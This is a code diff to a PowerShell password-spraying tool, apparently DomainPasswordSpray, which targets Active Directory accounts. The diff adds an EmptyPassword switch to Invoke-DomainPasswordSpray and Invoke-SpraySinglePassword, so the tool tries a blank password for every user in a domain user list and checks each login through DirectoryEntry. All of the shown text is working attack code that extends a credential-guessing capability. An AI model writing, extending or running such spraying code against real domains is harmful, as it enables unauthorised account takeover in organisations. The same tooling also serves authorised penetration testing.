@@ -45,6 +45,10 @@ function Invoke-DomainPasswordSpray{
     .PARAMETER UsernameAsPassword
 
     For each user, will try that user's name as their password
+    
+    .PARAMETER EmptyPassword
+
+    For each user, will try an empty password
 
     .EXAMPLE
 
@@ -109,7 +113,11 @@ function Invoke-DomainPasswordSpray{
      $Delay=0,
 
      [Parameter(Position = 9, Mandatory = $false)]
-     $Jitter=0
+     $Jitter=0,
+     
+     [Parameter(Position = 7, Mandatory = $false)]
+     [switch]
+     $EmptyPassword
 
     )
 
@@ -118,6 +126,10 @@ function Invoke-DomainPasswordSpray{
         $Passwords = @($Password)
     }
     elseif($UsernameAsPassword)
+    {
+        $Passwords = ""
+    }
+    elseif($EmptyPassword)
     {
         $Passwords = ""
     }
@@ -214,6 +226,10 @@ function Invoke-DomainPasswordSpray{
     if($UsernameAsPassword)
     {
         Invoke-SpraySinglePassword -Domain $CurrentDomain -UserListArray $UserListArray -OutFile $OutFile -Delay $Delay -Jitter $Jitter -UsernameAsPassword
+    }
+    elseif($EmptyPassword)
+    {
+        Invoke-SpraySinglePassword -Domain $CurrentDomain -UserListArray $UserListArray -OutFile $OutFile -Delay $Delay -Jitter $Jitter -EmptyPassword
     }
     else
     {
@@ -497,7 +513,10 @@ function Invoke-SpraySinglePassword
             $Jitter=0,
             [Parameter(Position=7)]
             [switch]
-            $UsernameAsPassword
+            $UsernameAsPassword,
+            [Parameter(Position=8)]
+            [switch]
+            $EmptyPassword
     )
     $time = Get-Date
     $count = $UserListArray.count
@@ -511,6 +530,10 @@ function Invoke-SpraySinglePassword
         if ($UsernameAsPassword)
         {
             $Password = $User
+        }
+        elseif($EmptyPassword)
+        {
+            $Password = ""
         }
         $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,$User,$Password)
         if ($Domain_check.name -ne $null)
